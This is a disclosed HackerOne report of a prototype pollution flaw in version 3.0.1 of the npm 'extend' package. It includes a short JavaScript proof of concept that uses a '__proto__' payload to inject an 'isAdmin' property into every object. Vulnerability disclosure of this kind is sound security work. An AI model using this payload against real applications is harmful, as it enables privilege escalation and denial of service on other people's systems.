# Prototype pollution attack (extend)

## Report Details
- **Report ID**: 381185
- **URL**: https://hackerone.com/reports/381185
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2018-07-13T10:04:52.180Z
- **Disclosed**: 2018-08-22T07:48:35.622Z

## Reporter
- **Username**: asgerf
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report prototype pollution in extend
It allows an attacker to inject properties on Object.prototype.

# Module

**module name:** extend
**version:** 3.0.1
**npm page:** `https://www.npmjs.com/package/extend`

## Module Description

`node-extend` is a port of the classic extend() method from jQuery. It behaves as you expect. It is simple, tried and true.

> **Note**: The github project is called `node-extend` but the NPM package is just `extend`

## Module Stats

7M downloads in the last week

# Vulnerability
## Vulnerability Description

This is a variant of this vulnerability:
https://hackerone.com/reports/310443

The `extend` function can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.

## Steps To Reproduce:

Craft an object of form `{__proto__: {...}}` and send it to `extend(true, {}, ...)`.

```javascript
let extend = require('extend');
let payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
extend(true, {}, payload);
console.log({}.isAdmin); // true
```

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Denial of service, possibly more depending on the application.
See https://hackerone.com/reports/310443

## Attachments
No attachments
